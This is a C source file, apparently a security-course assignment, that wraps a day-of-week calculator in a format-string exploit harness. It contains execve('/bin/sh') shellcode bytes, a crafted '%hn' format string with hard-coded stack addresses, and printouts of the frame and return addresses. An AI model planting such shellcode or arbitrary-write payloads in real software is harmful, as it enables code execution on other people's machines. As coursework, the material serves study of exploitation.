/*
 ============================================================================
 Name        : Assinment3Test.c
 Author      : Runjie
 Version     :
 Copyright   : Your copyright notice
 Description : Arbitrary Write in C, Ansi-style
 ============================================================================
 */

#include <stdio.h>
#include <math.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

char shellcode[] = "\x31\xc0"
		"\x50"
		"\x68" "//sh"
		"\x68" "/bin"
		"\x89\xe3"
		"\x50"
		"\x53"
		"\x89\xe1"
		"\x99"
		"\xb0\x0b"
		"\xcd\x80";

//#define main real_main

int fm(int date, int month, int year) {
   int fmonth, leap;

   //leap function 1 for leap & 0 for non-leap
   if ((year % 100 == 0) && (year % 400 != 0))
      leap = 0;
   else if (year % 4 == 0)
      leap = 1;
   else
      leap = 0;

   fmonth = 3 + (2 - leap) * ((month + 2) / (2 * month))
         + (5 * month + month / 9) / 2;

   //bring it in range of 0 to 6
   fmonth = fmonth % 7;

   return fmonth;
}

//----------------------------------------------
int day_of_week(int date, int month, int year) {

   int dayOfWeek;
   int YY = year % 100;
   int century = year / 100;

   printf("\nDate: %d/%d/%d \n", date, month, year);

   dayOfWeek = 1.25 * YY + fm(date, month, year) + date - 2 * (century % 4);

   //remainder on division by 7
   dayOfWeek = dayOfWeek % 7;

   switch (dayOfWeek) {
      case 0:
         printf("weekday = Saturday");
         break;
      case 1:
         printf("weekday = Sunday");
         break;
      case 2:
         printf("weekday = Monday");
         break;
      case 3:
         printf("weekday = Tuesday");
         break;
      case 4:
         printf("weekday = Wednesday");
         break;
      case 5:
         printf("weekday = Thursday");
         break;
      case 6:
         printf("weekday = Friday");
         break;
      default:
         printf("Incorrect data");
   }
   return 0;
}
//------------------------------------------
int main(int argc, char *argv[]){
	int ret = 0;
	char fmt[64];
	strcpy(fmt,"\x2c\xcf\xff\xff\x2e\xcf\xff\xff%40988x%19$hn");   //exploit code
	argv[1] = fmt;
	ret = real_main(argc, argv);
	return ret;
}

int real_main(int argc, char *argv[]) {
   int date, month, year;

   // Exploit code defined here:
   printf("shellcode = %08x\n",&shellcode);
   printf("argv[1] = %08x\n",&argv[1]);
   register int ebp asm ("ebp");
   printf("ebp=%08x, retaddr=%08x, *retaddr=%x\n", ebp, (unsigned long *)(ebp+4), *(unsigned long *)(ebp+4));
   register int esp asm ("esp");
   printf("esp=%08x\n", esp);
   //printf(argv[1]);
   printf("ebp=%08x, retaddr=%08x, *retaddr=%x\n", ebp, (unsigned long *)(ebp+4), *(unsigned long *)(ebp+4));

   printf("\nEnter the year ");
   scanf("%d", &year);

   printf("\nEnter the month ");
   scanf("%d", &month);

   printf("\nEnter the date ");
   scanf("%d", &date);

   day_of_week(date, month, year);

   return 0;
}
